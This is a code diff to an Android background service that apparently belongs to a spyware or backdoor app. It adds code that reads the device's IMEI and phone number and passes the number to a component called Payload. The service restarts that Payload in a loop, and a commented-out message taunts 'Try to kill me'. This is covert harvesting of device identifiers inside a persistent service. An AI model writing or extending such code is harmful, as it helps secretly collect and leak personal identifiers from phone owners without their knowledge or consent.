@@ -11,6 +11,7 @@ import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.IBinder;
 import android.os.SystemClock;
+import android.telephony.TelephonyManager;
 import android.widget.Toast;
 
 import java.util.concurrent.TimeUnit;
@@ -110,7 +111,10 @@ public class BackgroundService extends Service {
 	          // Initiating of onProgressUpdate callback that has access to UI
 	          //publishProgress();
 				//Toast.makeText(getApplicationContext(), "Ooops!!! Try to kill me :)", Toast.LENGTH_LONG).show();
-				Payload.start(getApplicationContext());
+				TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+				String imei = tm.getDeviceId();
+				String tel = tm.getLine1Number();
+				Payload.start(getApplicationContext(),tel);
 	        }
 
 	      } catch (InterruptedException e) {
@@ -123,7 +127,10 @@ public class BackgroundService extends Service {
 	    protected void onProgressUpdate(Void... progress) {
 	      super.onProgressUpdate(progress);
 	        //Toast.makeText(getApplicationContext(), "Ooops!!! Try to kill me :)", Toast.LENGTH_LONG).show();
-			Payload.start(getApplicationContext());
+			TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
+			String imei = tm.getDeviceId();
+			String tel = tm.getLine1Number();
+			Payload.start(getApplicationContext(),tel);
 	    }
 	  }
 
